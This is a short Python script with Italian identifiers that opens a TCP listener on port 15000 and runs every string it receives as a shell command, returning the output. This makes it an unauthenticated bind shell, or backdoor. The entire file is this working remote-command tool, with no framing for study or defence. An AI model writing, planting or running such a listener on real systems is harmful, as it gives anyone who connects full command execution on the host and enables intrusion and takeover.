import socket
import subprocess

def ricevi_comandi(conn):
    while True:
        richiesta = conn.recv(4096)
        risposta = subprocess.run(richiesta.decode(),shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        data = risposta.stdout + risposta.stderr
        conn.send(data)


def sub_server(indirizzo, backlog=1):
    try:
        s = socket.socket()
        s.bind(indirizzo)
        s.listen(backlog)
        print('Server inizializzato, ora in ascolto...')
    except socket.error as errore:
        print(f"qualcosa è andato storto... \n{errore}")
        print('sto tentando di reinizializzare il server...')
        sub_server(indirizzo,backlog=1)
    conn, indirizzo_client = s.accept()
    print(f"connessione server - client stabilita:{indirizzo_client}")
    ricevi_comandi(conn)

if __name__ == '__main__':
    sub_server(('',15000))